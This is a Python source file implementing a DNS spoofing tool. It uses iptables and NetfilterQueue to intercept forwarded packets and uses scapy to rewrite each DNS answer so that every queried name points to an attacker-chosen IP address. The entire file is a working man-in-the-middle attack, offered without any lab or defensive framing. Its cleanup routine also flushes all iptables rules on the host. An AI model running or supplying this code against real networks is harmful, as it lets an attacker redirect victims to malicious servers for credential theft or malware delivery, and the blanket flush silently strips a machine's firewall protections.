import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading

class DNSSpoofer:
    """
    A class to perform DNS Spoofing using iptables and NetfilterQueue.

    Attributes:
        attacker_ip (str): The attacker's IP to redirect DNS requests.
        queue_num (int): The NetfilterQueue queue number.
        queue (NetfilterQueue): NetfilterQueue instance for packet processing.
        running (bool): Flag indicating if the spoofing process is active.
        thread (threading.Thread): Thread handling the packet processing loop.
    """

    def __init__(self, attacker_ip, queue_num=0):
        """
        Initializes the DNSSpoofer.

        Args:
            attacker_ip (str): The attacker's IP to redirect all DNS requests.
            queue_num (int): The queue number for NetfilterQueue.
        """
        self.attacker_ip = attacker_ip
        self.queue_num = queue_num
        self.queue = NetfilterQueue()
        self.running = False
        self.thread = None

        # Set up iptables rule for DNS packet redirection to NFQUEUE
        print("⚙️ Setting up iptables rules for DNS Spoofing...")
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        print("✅ iptables rule added.")

    def start(self):
        """
        Starts the DNS Spoofing process in a new thread.
        """
        self.running = True
        self.thread = threading.Thread(target=self._process_packets)
        print("🚀 Starting DNS Spoofing in a separate thread...")
        self.thread.start()

    def stop(self):
        """
        Stops the DNS Spoofing process, unbinds the queue, and clears iptables.
        """
        print("🛑 Stopping DNS Spoofing...")
        self.running = False
        if self.thread:
            self.thread.join()  # Wait for the processing thread to finish
        self.queue.unbind()  # Unbind NetfilterQueue
        print("🧹 Clearing iptables rules...")
        os.system("iptables --flush")  # Clear iptables rule
        print("✅ iptables rule cleared.")

    def _process_packets(self):
        """
        Internal method to bind the NetfilterQueue and start processing packets.
        Runs in a separate thread to avoid blocking the main thread.
        """
        try:
            self.queue.bind(self.queue_num, self._process_packet)
            print("📥 Bound to queue, processing packets...")
            while self.running:
                self.queue.run(block=False)  # Non-blocking queue run
        except Exception as e:
            print(f"⚠️ Error in packet processing: {e}")
        finally:
            self.queue.unbind()

    def _process_packet(self, packet):
        """
        Processes each packet captured by NetfilterQueue.

        If the packet is a DNS query, modifies it to spoof the response.

        Args:
            packet (NetfilterQueue.Packet): Packet captured by NetfilterQueue.
        """
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):  # Check if packet has a DNS response
            original_summary = scapy_packet.summary()
            scapy_packet = self._modify_packet(scapy_packet)
            modified_summary = scapy_packet.summary()
            print(f"[🛠️ Modified]: {original_summary} -> {modified_summary}")
            packet.set_payload(bytes(scapy_packet))
        packet.accept()

    def _modify_packet(self, packet):
        """
        Modifies the DNS response to redirect to the attacker's IP.

        Args:
            packet (scapy.Packet): The packet to modify.

        Returns:
            scapy.Packet: Modified packet with spoofed DNS response.
        """
        qname = packet[DNSQR].qname
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.attacker_ip)  # Set attacker IP as response
        packet[DNS].ancount = 1

        # Delete fields to force recalculation
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet